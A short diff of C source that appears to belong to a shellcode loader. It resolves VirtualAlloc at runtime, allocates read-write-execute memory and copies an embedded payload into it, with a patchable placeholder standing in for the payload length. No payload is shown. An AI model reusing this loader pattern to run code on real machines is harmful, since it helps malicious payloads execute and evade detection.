@@ -85,7 +85,9 @@ int main()
 			_In_ DWORD  flProtect)) _GetProcAddress((HMODULE)base, VirtualAlloc_str);
 	if (_VirtualAlloc == NULL) return 4;
 	char *dest = _VirtualAlloc(NULL, 4096, 0x3000, 0x40);
-	for(int n=0; n<347+1; n++) {
+	// 11223344 is a magic number which will be replaced in the asm source
+	// with the payload length.
+	for(int n=0; n<11223344; n++) {
 		dest[n] = dobin[n];
 	}
 
